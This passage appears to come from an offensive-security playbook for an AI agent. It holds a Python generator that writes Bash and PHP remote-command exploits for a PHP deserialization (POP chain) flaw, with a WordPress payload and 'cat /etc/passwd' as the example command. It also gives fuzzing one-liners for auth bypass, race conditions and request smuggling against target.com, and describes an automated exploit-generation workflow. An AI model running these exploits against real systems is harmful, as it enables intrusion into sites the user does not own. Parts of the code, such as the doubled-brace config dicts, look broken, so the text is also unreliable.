        -H "Content-Type: application/x-www-form-urlencoded" \\
        -d "data=$payload" \\
        -w "\\n%{{http_code}}")

    status_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | head -n -1)

    echo -e "${{GREEN}}[+] Status: $status_code${{NC}}"
    echo -e "${{GREEN}}[+] Response:${{NC}}"
    echo "$body"
}}

if [ $# -lt 1 ]; then
    echo "Usage: $0 <command>"
    echo "Example: $0 'cat /etc/passwd'"
    exit 1
fi

exploit "$@"
'''

        output_path = self.poc_dir / output_name
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(exploit)
        os.chmod(output_path, 0o755)  # Make executable
        print(f"[+] Bash exploit saved: {output_path}")
        return exploit

    def generate_php_exploit(self, output_name=None):
        """Generate PHP exploit script"""
        if output_name is None:
            output_name = f"{self.vuln_info.get('name', 'pop_chain')}_rce.php"

        exploit = f'''<?php
/**
 * POP Chain Exploit for {self.target}
 * Vulnerability: {self.vuln_info.get("description", "Unserialize RCE")}
 */

$TARGET = "{self.target}";
$ENTRY_POINT = "{self.chain.get("entry_point", "/api/unserialize")}";

/**
 * Generate POP chain payload
 */
function generatePayload($command = 'id') {{
    $payload = '{self.chain.get("payload", "")}';
    return str_replace('{{{{COMMAND}}}}', $command, $payload);
}}

/**
 * Execute exploit
 */
function exploit($command = 'id') {{
    global $TARGET, $ENTRY_POINT;

    $payload = base64_encode(generatePayload($command));

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $TARGET . $ENTRY_POINT);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "data=$payload");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded'
    ]);

    $response = curl_exec($ch);
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    echo "[+] Status: $status\\n";
    echo "[+] Response:\\n";
    echo $response . "\\n";

    return $response;
}}

// Parse command line arguments
if ($argc < 2) {{
    echo "Usage: php {output_name} <command>\\n";
    echo "Example: php {output_name} 'cat /etc/passwd'\\n";
    exit(1);
}}

$command = $argv[1];
echo "[*] Target: $TARGET\\n";
echo "[*] Command: $command\\n";
echo "[*] Exploiting...\\n";

exploit($command);
?>
'''

        output_path = self.poc_dir / output_name
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(exploit)
        print(f"[+] PHP exploit saved: {output_path}")
        return exploit

    def generate_all_exploits(self):
        """Generate exploits in all formats"""
        print(f"[+] Generating exploits for {self.vuln_info.get('name', 'POP Chain')}...")
        self.generate_python_exploit()
        self.generate_bash_exploit()
        self.generate_php_exploit()
        print(f"[+] All exploits saved to {self.poc_dir}/")


# Usage Example
if __name__ == "__main__":
    # WordPress 6.4.3 Session Token Hijack
    wordpress_config = {
        {
            "target": "http://localhost:8080",
            "name": "wordpress_session_hijack",
            "description": "WordPress Unserialize RCE via WP_User_Meta_Session_Tokens",
            "cvss": "9.8 (Critical)",
            "date": "2025-01-22",
        }
    }

    chain_config = {
        {
            "entry_point": "/wp-admin/admin-ajax.php",
            "payload": 'O:28:"WP_User_Meta_Session_Tokens":2:{{s:44:"\\0WP_User_Meta_Session_Tokens\\0session";a:1:{{i:0;s:32:"HACKED_TOKEN";}}}}s:44:"\\0WP_User_Meta_Session_Tokens\\0user_id";i:1;}}}}',
        }
    }

    generator = POPExploitGenerator(wordpress_config["target"], wordpress_config, chain_config)

    # Generate all exploits
    generator.generate_all_exploits()
```

---

# PROTOCOL FUZZING PAYLOADS — 0-Day Discovery

> **Black-box testing**: Test how applications handle unexpected request sequences, state transitions, and protocol violations.

## HTTP Method Confusion

```bash
# Test every endpoint with every HTTP method
while read endpoint; do
    for method in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE CONNECT; do
        curl -s -X "$method" "https://target.com$endpoint" \\
            -o /dev/null -w "METHOD:$method STATUS:%{{http_code}} ENDPOINT:$endpoint\n"
    done
done < endpoints.txt
```

## Content-Type Confusion

```bash
# Send same data with different content types
for ctype in "application/json" "application/xml" "text/xml" \\
    "application/x-www-form-urlencoded" "multipart/form-data" \\
    "application/octet-stream" "text/plain"; do
    curl -X POST "https://target.com/api/data" \\
        -H "Content-Type: $ctype" \\
        -d '{"test": "value"}'
done
```

## State Machine Abuse

```bash
# Request states in wrong order (skip auth, revisit states, etc.)
curl "http://target.com/login"           # Step 1
curl "http://target.com/dashboard"      # Step 2 (should fail)
curl "http://target.com/admin"          # Step 3 (try anyway)
curl "http://target.com/logout"         # Step 4
curl "http://target.com/admin"          # Step 5 (revisit after logout)

# Parallel requests (race condition)
seq 1 50 | xargs -P 50 -I {} curl -s "http://target.com/api/transfer?amount=100"
```

## Header Injection Fuzzing

```bash
# Test IP bypass headers
for header in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" \\
    "X-Originating-IP: 127.0.0.1" "X-Remote-IP: 127.0.0.1" \\
    "X-Remote-Addr: 127.0.0.1" "X-Host: localhost" \\
    "X-Original-URL: /admin" "X-Rewrite-URL: /admin"; do
    curl -H "$header" "http://target.com/api/admin"
done
```

## Chunked Encoding Abuse

```http
# Malformed chunk sizes
POST /api/upload HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5
hello
-5
evil
0

# Negative chunk, chunk without data, oversized chunk
```

---

# NOVEL VULNERABILITY DISCOVERY PATTERNS

## Assumption Breaking Checklist

```
For each feature, ask:
[ ] What validates input here?
[ ] What if this call fails?
[ ] What if two users do this simultaneously?
[ ] What if the data changes mid-operation?
[ ] What if I send the WRONG content-type?
[ ] What if I NEVER respond to a challenge?
[ ] What if I replay an old message?
[ ] What if I send an empty/null value?
[ ] What if I send maximum/negative values?
[ ] What if I skip this step entirely?
```

## Design Contradiction Discovery

```
# Documentation vs Implementation
1. Read documentation → Find security guarantees
2. Read source code → Find actual enforcement
3. Identify gaps → These are 0-days

Example:
Doc: "Auth required for all API endpoints"
Code: /api/export has no middleware → 0-day found
```

## Feature Interaction Matrix

```
Export + Import     → Export → Edit → Import = Privilege escalation
Webhook + Email     → Webhook URL → Email injection → SSRF
Share + Edit        → Share link + edit = Access control bypass
OAuth + Legacy      → OAuth token + legacy API = Token theft
Caching + Auth      → Cached auth response = Session confusion
Async + Callback    → Async job + callback = Race condition
```

## Taint Analysis Grep Patterns

```bash
# PHP - Find dangerous sinks
grep -rn "eval\|exec\|system\|passthru\|shell_exec" --include="*.php"

# JavaScript - Find XSS sinks
grep -rn "innerHTML\|eval\|document.write" --include="*.js"

# Python - Find deserialization
grep -rn "pickle\.loads\|marshal\.loads" --include="*.py"

# Ruby - Find YAML.load (vulnerable)
grep -rn "YAML\.load[^_]\|Marshal\.load" --include="*.rb"

# Java - Find unsafe deserialization
grep -rn "ObjectInputStream\|XMLDecoder" --include="*.java"

# Go - Find template rendering
grep -rn "template\.Execute\|template\.HTML" --include="*.go"

# SQL concatenation (all languages)
grep -rnE '(\+|\.\||concat|format).*\$(REQUEST|GET|POST|cookie)' \\
    --include="*.php" --include="*.js" --include="*.py"
```

---

# EXPLOITATION WORKFLOW — Auto-Generate PoC

## When Vulnerability is Confirmed

```python
# Automatic exploit generation workflow
class ExploitWorkflow:
    """Generate exploit code when vulnerability is confirmed"""

    def __init__(self, vuln_type, target, details):
        self.vuln_type = vuln_type
        self.target = target
        self.details = details
        self.poc_dir = Path("poc")

    def generate_and_save(self):
        """Generate exploit in all requested languages"""

        if self.vuln_type == "pop_chain":
            generator = POPExploitGenerator(self.target, self.details, self.details["chain"])
            generator.generate_all_exploits()

        elif self.vuln_type == "sqli":
            # Generate SQLi exploit
            pass

        elif self.vuln_type == "ssrf":
            # Generate SSRF exploit
            pass

        # Add more vuln types...

    def test_exploit(self, exploit_path):
        """Test the generated exploit before saving"""
        # Run exploit with safe test command
        # Verify it works
        # Save if confirmed
        pass
```

## Supported Exploit Languages

- Python 3 (recommended for cross-platform)
- Bash (for quick testing)
- PHP (for WordPress/Drupal targets)
- Node.js (for modern web apps)
- Go (for high-performance exploits)
- Ruby (for legacy Rails apps)

## Exploit Template Structure

```
poc/
├── [vuln_name]_rce.py          # Python exploit
├── [vuln_name]_rce.sh          # Bash exploit
├── [vuln_name]_rce.php         # PHP exploit
└── README.md                    # Exploit documentation
```
```

---

**Evidence & reporting (ida_mcp workflow).** Every claim needs decompilation/xref/data-flow evidence (`analyze_function`/`decompile_function`/`trace_data_flow`/`callgraph`); use `int_convert` for bases; write `re/summary.md`, `re/analysis.md`, `re/findings.md` with hex addresses and the tool behind each claim. Mutations (`set_name`/`set_comment`/`set_type`/`patch_*`/`execute_script`) require `?unsafe=true`; live debugging requires `?unsafe=true&ext=dbg`.
